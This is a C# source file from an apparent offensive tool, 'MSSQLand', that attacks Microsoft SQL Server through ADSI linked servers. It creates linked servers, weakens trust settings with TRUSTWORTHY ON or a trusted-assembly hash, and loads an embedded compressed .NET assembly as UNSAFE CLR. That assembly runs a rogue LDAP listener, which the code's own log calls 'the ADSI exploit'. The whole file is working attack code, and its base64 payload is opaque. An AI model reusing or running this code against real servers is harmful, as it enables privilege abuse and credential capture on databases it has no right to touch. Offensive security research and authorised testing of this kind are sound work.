using MSSQLand.Utilities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Threading.Tasks;

namespace MSSQLand.Services
{
    internal class AdsiService
    {

        private readonly DatabaseContext _databaseContext;

        public int Port = 12235;
     
        public string AssemblyName = "ldapServer";
        public string FunctionName = $"f_{Misc.GetRandomIdentifier()}";
        public string LibraryPath = $"l_{Misc.GetRandomIdentifier()}";

        public AdsiService(DatabaseContext databaseContext)
        {
            _databaseContext = databaseContext;
        }

        /// <summary>
        /// Lists all ADSI linked servers.
        /// </summary>
        /// <returns>A list of ADSI server names, or null if none found.</returns>
        public List<string> ListAdsiServers()
        {
            // Filter by ADsDSOObject provider (product name varies, provider is consistent)
            string query = "SELECT srvname FROM master.dbo.sysservers WHERE providername = 'ADsDSOObject'";
            DataTable result = _databaseContext.QueryService.ExecuteTable(query);

            if (result.Rows.Count == 0)
            {
                return null;
            }

            return result.AsEnumerable()
                         .Select(row => row.Field<string>("srvname"))
                         .ToList();
        }

        /// <summary>
        /// Checks if an ADSI linked server exists.
        /// </summary>
        /// <param name="serverName">The name of the ADSI server to check.</param>
        /// <returns>True if the server exists and is an ADSI provider; otherwise, false.</returns>
        public bool AdsiServerExists(string serverName)
        {
            List<string> adsiServers = ListAdsiServers();
            return adsiServers != null && adsiServers.Contains(serverName, StringComparer.OrdinalIgnoreCase);
        }

        public bool CheckLinkedServer(string linkedServerName)
        {
            try
            {
                // Retrieve the list of linked servers
                DataTable result = _databaseContext.QueryService.ExecuteTable("EXEC sp_linkedservers;");

                // Check if the linked server exists and has the correct provider
                foreach (DataRow row in result.Rows)
                {
                    string srvName = row[0].ToString(); // First column (srv_name)
                    string srvProviderName = row[1].ToString(); // Second column (srv_providername)

                    if (srvName.Equals(linkedServerName, StringComparison.OrdinalIgnoreCase))
                    {
                        if (srvProviderName.Equals("ADSDSOObject", StringComparison.OrdinalIgnoreCase))
                        {
                            // Linked server exists and is properly configured
                            return true;
                        }
                        else
                        {
                            // Linked server exists but has an incorrect provider
                            Logger.Error($"Linked server '{linkedServerName}' exists, but the provider is '{srvProviderName}' instead of 'ADSDSOObject'.");
                            return false;
                        }
                    }
                }

                // If no matching linked server was found
                Logger.Error($"Linked server '{linkedServerName}' does not exist.");
                return false;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error while checking linked server: {ex.Message}");
                return false;
            }
        }

        public bool CreateAdsiLinkedServer(string serverName, string dataSource = "localhost")
        {
            string query = @$"
            EXEC sp_addlinkedserver 
                @server = '{serverName}',
                @srvproduct = 'ADSI',
                @provider = 'ADSDSOObject',
                @datasrc = '{dataSource}';";

            try
            {
                _databaseContext.QueryService.ExecuteNonProcessing(query);
                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error while creating linked server: {ex.Message}");
                return false;
            }
        }

        public void DropLinkedServer(string serverName)
        {
            _databaseContext.QueryService.ExecuteNonProcessing($"EXEC sp_dropserver @server = '{serverName}';");
        }


        public Task<DataTable> ListenForRequest()
        {
            // Create a TaskCompletionSource to manage the result
            TaskCompletionSource<DataTable> taskCompletionSource = new();

            // Start the listener on a new thread using a duplicated context (fresh connection, same linked servers)
            Task.Run(() =>
            {
                try
                {
                    using DatabaseContext listenerContext = _databaseContext.Duplicate();

                    Logger.Info($"Starting a local LDAP server on port {Port} using function '{FunctionName}'");

                    try
                    {
                        // Execute the LDAP listener query through the duplicated context
                        DataTable result = listenerContext.QueryService.ExecuteTable($"SELECT [dbo].[{FunctionName}]({Port},8);");

                        // Set the result once the query completes
                        taskCompletionSource.TrySetResult(result);
                    } 
                    catch
                    {
                        // Could happen if the query times out
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error($"Error while running LDAP server: {ex.Message}");
                    taskCompletionSource.TrySetException(ex);
                }
            });

            return taskCompletionSource.Task;
        }




        public bool LoadLdapServerAssembly()
        {
            // Obtain the LDAP server assembly in SQL byte format, along with the hash of the assembly
            string[] ldapAssembly = GetLdapServerAssembly();

            string libraryHash = ldapAssembly[1];
            string libraryHexBytes = ldapAssembly[0];

            Logger.Task("Deploying the LDAP server assembly");
            Logger.TaskNested($"Assembly name: {AssemblyName}");
            Logger.TaskNested($"Function name: {FunctionName}");
            Logger.TaskNested($"Library name: {LibraryPath}");

            string dropFunction = $"DROP FUNCTION IF EXISTS [{FunctionName}];";
            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{AssemblyName}];";
            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash};";


            try
            {

                if (_databaseContext.QueryService.ExecutionServer.IsLegacy)
                {
                    Logger.Info("IsLegacy server detected. Enabling TRUSTWORTHY property");
                    _databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE [{_databaseContext.QueryService.ExecutionServer.Database}] SET TRUSTWORTHY ON;");
                }
                else
                {
                    if (_databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, LibraryPath) == false)
                    {
                        Logger.Error("Failed to register trusted assembly. Aborting execution.");
                        return false;
                    }
                }

                // Drop existing objects
                _databaseContext.ConfigService.DropDependentObjects(AssemblyName);

                // Drop existing objects
                _databaseContext.QueryService.ExecuteNonProcessing(dropFunction);
                _databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);


                // Deploy the assembly
                Logger.Task("Deploying the LDAP server assembly");
                _databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE ASSEMBLY [{AssemblyName}] AUTHORIZATION [dbo] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");

                // Check if the assembly was successfully deployed
                if (!_databaseContext.ConfigService.CheckAssembly(AssemblyName))
                {
                    Logger.Error($"Failed to create assembly '{AssemblyName}'. It might not have been loaded correctly.");
                    _databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                    return false;
                }


                Logger.Success($"LDAP server assembly '{AssemblyName}' created successfully");


                // Create the function
                Logger.Task("Creating the LDAP server function");
                _databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE FUNCTION [dbo].[{FunctionName}](@port int, @timeoutSeconds int) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME {AssemblyName}.[ldapAssembly.LdapSrv].Listen;");

                if (!_databaseContext.ConfigService.CheckAssemblyModules("ldapsrv"))
                {
                    Logger.Error("Failed to create the LDAP server function");
                    _databaseContext.QueryService.ExecuteNonProcessing(dropFunction);
                    _databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                    _databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                    return false;
                }

                Logger.Success($"LDAP server function '{FunctionName}' created successfully");

                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error occurred during the ADSI exploit: {ex.Message}");
                Logger.InfoNested($"Deleting LDAP server assembly '{AssemblyName}', function '{FunctionName}' and trusted assembly hash");
                _databaseContext.QueryService.ExecuteNonProcessing(dropFunction);
                _databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                _databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);

                return false;


            }
            finally
            {
                // Reset TRUSTWORTHY property for legacy servers
                if (_databaseContext.QueryService.ExecutionServer.IsLegacy)
                {
                    Logger.Info("Resetting TRUSTWORTHY property");
                    _databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE [{_databaseContext.QueryService.ExecutionServer.Database}] SET TRUSTWORTHY OFF.");
                }

            }
        }


        /// <summary>
        /// This function contains the .NET assembly for an LDAP server
        /// in SQL byte format, as well as the SHA-512 hash for the assembly.
        /// </summary>
        /// <returns></returns>
        private string[] GetLdapServerAssembly()
        {
            string[] libraryArray = new string[2];

            string compressedBase64 = "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";

            // Decode and decompress back to original bytes
            byte[] decompressedBytes = Misc.DecodeAndDecompress(compressedBase64);
            string decompressedHex = Misc.BytesToHexString(decompressedBytes);

            // This is the .NET assembly for an LDAP server in SQL byte format.
            libraryArray[0] = decompressedHex;

            // This is the SHA-512 hash for the LDAP server .NET assembly in SQL byte format.
            libraryArray[1] = "B9B9B219F78283AF6F85EA2186373278FBA7C8B1FCF481638A5D40BD376BB686359BF5EB5C35AE179BEA87BA501AD62CD62771B53515AB40A30283EE85635E6D";

            return libraryArray;
        }
    }
}
